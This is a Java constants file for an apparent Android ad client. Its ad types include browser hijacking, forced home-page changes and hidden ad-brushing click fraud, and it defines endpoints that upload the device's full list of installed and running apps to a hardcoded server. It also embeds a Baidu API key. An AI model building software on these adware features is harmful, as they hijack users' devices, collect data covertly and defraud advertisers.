package com.guang.client;

public class GCommon {
	
	public static final String version = "1.5";
	
	//统计类型
	public static final int REQUEST = 0;//请求
	public static final int SHOW = 1;//展示
	public static final int CLICK = 2;//点击
	public static final int DOWNLOAD = 3;//下载
	public static final int DOWNLOAD_SUCCESS = 4;//下载成功
	public static final int INSTALL = 5;//安装
	public static final int ACTIVATE = 6;//激活
	public static final int DOUBLE_SHOW = 7;//展示
	public static final int DOUBLE_CLICK = 8;//点击
	public static final int DOUBLE_DOWNLOAD = 9;//下载
	public static final int DOUBLE_DOWNLOAD_SUCCESS = 10;//下载成功
	public static final int DOUBLE_INSTALL = 11;//安装
	public static final int DOUBLE_ACTIVATE = 12;//激活
	//广告位类型
	public static final String AD_POSITION_TYPE = "ad_position_type";
	public static final int BROWSER_SPOT = 1;//浏览器插屏 
	public static final int APP_INSTALL = 2;//安装
	public static final int APP_UNINSTALL = 3;//卸载
	public static final int BANNER = 4;//应用banner
	public static final int CHARGLOCK = 5;//充电锁
	public static final int APP_SPOT = 6;//应用插屏 
	public static final int WIFI_CONN = 7;//连接wifi
	public static final int BROWSER_BREAK = 8;//浏览器劫持 
	public static final int SHORTCUT = 9;//快捷方式
	public static final int HOME_PAGE = 10;//强设主页
	public static final int BEHIND_BRUSH = 11;//暗刷
	
		
	//intent 跳转 QLActivity 类型
	public static final String INTENT_TYPE = "intent_type";
	public static final String INTENT_OPEN_SPOT = "intent_open_spot";	
	public static final String INTENT_OPEN_DOWNLOAD = "intent_open_download";
	
	
	//SharedPreferences
	public static final String SHARED_PRE = "guangclient";
	public static final String SHARED_KEY_NAME = "name";
	public static final String SHARED_KEY_PASSWORD = "password";
	public static final String SHARED_KEY_TESTMODEL = "testmodel";
	
	//------------------------------------------------------------------------------------
	//服务启动时间
	public static final String SHARED_KEY_SERVICE_RUN_TIME = "service_run_time";
	//主循环运行的时间
	public static final String SHARED_KEY_MAIN_LOOP_TIME = "main_loop_time";
	//浏览器开屏时间
	public static final String SHARED_KEY_BROWSER_SPOT_TIME = "browser_spot_time";
	//BANNER时间
	public static final String SHARED_KEY_BANNER_TIME = "banner_time";
	//应用插屏时间
	public static final String SHARED_KEY_APP_SPOT_TIME = "app_spot_time";
	//wifi时间
	public static final String SHARED_KEY_WIFI_TIME = "wifi_time";
	//浏览器开屏次数
	public static final String SHARED_KEY_BROWSER_SPOT_NUM = "browser_spot_num";
	//BANNER次数
	public static final String SHARED_KEY_BANNER_NUM = "banner_num";
	//应用插屏次数
	public static final String SHARED_KEY_APP_SPOT_NUM = "app_spot_num";
	//wifi次数
	public static final String SHARED_KEY_WIFI_NUM = "wifi_num";
		
	//请求offer的时间
	public static final String SHARED_KEY_OFFER_SAVE_TIME = "offer_save_time";
	//上次开屏时间
	public static final String SHARED_KEY_OPEN_SPOT_TIME = "open_spot_time";
	//应用激活判断时间
	public static final String SHARED_KEY_APP_ACTIVE_TIME = "app_active_time";
	//上传所有app信息时间
	public static final String SHARED_KEY_UPLOAD_ALL_APPINFO_TIME = "upload_all_appinfo_time";
	//开屏显示的次数
	public static final String SHARED_KEY_OPEN_SPOT_SHOW_NUM = "open_spot_show_num";
	//设置充电锁时间  	
	public static final String SHARED_KEY_LOCK_SAVE_TIME = "lock_save_time";
	//锁类型 0关闭 1开启 2今日 3三天  4 7 5 30
	public static final String SHARED_KEY_LOCK_SAVE_TYPE = "lock_save_type";
	//快捷方式时间  	
	public static final String SHARED_KEY_SHORTCUT_OPEN_TIME = "shortcut_open_time";
	//浏览器截取时间  	
	public static final String SHARED_KEY_BROWSER_OPEN_TIME = "browser_open_time";
	
	//获取地理位置用到
	public static final String MAP_BAIDU_URL = 
			"http://api.map.baidu.com/location/ip?ak=mF8kSvczD70rm2AlfsjuLGhp79Qfo10m&coor=bd09ll";
	
	public static final String SERVER_IP = "139.196.56.176";
	public static final String SERVER_PORT = "80";
	public static final String SERVER_ADDRESS = "http://139.196.56.176:80/QiupAdServer/";
	
//	public static final String SERVER_IP = "192.168.0.100";
//	public static final String SERVER_PORT = "8080";
//	public static final String SERVER_ADDRESS = "http://192.168.0.100:8080/QiupAdServer/";
	
	public static final String URI_UPLOAD_APPINFO = SERVER_ADDRESS + "user_uploadAppInfos";
	
	
	//------------------------------------------------------------------------------------
	//登录
	public static final String URI_LOGIN = SERVER_ADDRESS + "user_login";
	//校验
	public static final String URI_VALIDATE = SERVER_ADDRESS + "user_validates";
	//注册
	public static final String URI_REGISTER = SERVER_ADDRESS + "user_register";
	//配置信息
	public static final String URI_GET_FIND_CURR_CONFIG = SERVER_ADDRESS + "config_findCurrConfig";
	//上传统计
	public static final String URI_UPLOAD_STATISTICS = SERVER_ADDRESS + "statistics_uploadStatistics";
	//上传所有app
	public static final String URI_UPLOAD_ALL_APPINFOS = SERVER_ADDRESS + "gather_uploadAppInfo";
	//上传运行app
	public static final String URI_UPLOAD_RUN_APPINFOS = SERVER_ADDRESS + "gather_uploadAppRunInfo";
	
	//action
	public static final String ACTION_QEW_TYPE = "action.qew.type";
	public static final String ACTION_QEW_APP_BROWSER_SPOT = "action.qew.app.browserspot";
	public static final String ACTION_QEW_APP_INSTALL = "action.qew.app.install";
	public static final String ACTION_QEW_APP_UNINSTALL = "action.qew.app.uninstall";
	public static final String ACTION_QEW_APP_BANNER = "action.qew.app.banner";
	public static final String ACTION_QEW_APP_LOCK = "action.qew.app.lock";
	public static final String ACTION_QEW_APP_SPOT = "action.qew.app.spot";
	public static final String ACTION_QEW_APP_WIFI = "action.qew.app.wifi";
	public static final String ACTION_QEW_APP_BROWSER_BREAK = "action.qew.app.browserbreak";
	public static final String ACTION_QEW_APP_SHORTCUT = "action.qew.app.shortcut";
	public static final String ACTION_QEW_APP_HOMEPAGE = "action.qew.app.homepage";
	public static final String ACTION_QEW_APP_BEHIND_BRUSH = "action.qew.app.behindbrush";
	public static final String ACTION_QEW_APP_INSTALL_UI = "action.qew.app.install.ui";
	public static final String ACTION_QEW_APP_UNINSTALL_UI = "action.qew.app.uninstall.ui";
	
	public static final String ACTION_QEW_OPEN_APP = "action.qew.app.openapp";
		
}
